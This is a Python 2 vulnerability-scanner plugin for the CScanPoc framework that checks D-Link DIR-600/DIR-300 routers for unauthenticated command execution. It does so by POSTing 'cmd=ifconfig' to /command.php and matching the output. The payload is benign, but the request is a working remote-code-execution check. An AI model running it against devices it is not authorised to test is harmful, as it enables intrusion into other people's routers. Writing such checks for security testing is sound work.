# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'D-Link_0003' # 平台漏洞编号，留空
    name = 'D-Link Command_Execution'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = ' 2013-02-04'  # 漏洞公布时间
    desc = '''
        D-Link® introduces the Wireless 150 Router (DIR-600), which delivers high performance end-to-end wireless connectivity based on 802.11n technology. 
        The DIR-600 provides better wireless coverage and improved speeds over standard 802.11g*. 
        Upgrading your home network to Wireless 150 provides an excellent solution for 
        experiencing better wireless performance while sharing a broadband Internet connection with 
        multiple computers over a secure wireless network.
    '''  # 漏洞描述
    ref = 'http://www.s3cur1ty.de/m1adv2013-003'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'D-Link'  # 漏洞应用名称
    product_version = 'DIR-600/DIR_300'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'daad711a-f881-483d-965b-8e1528e1a8cc'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            url = self.target + '/command.php'
            postpayload = 'cmd=ifconfig'
            code, head, res, errcode, _ = hh.http(url,postpayload)
            if code == 200 and "Ethernet  HWaddr" in res:
                #security_hole('Find Command_Execution:' + url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
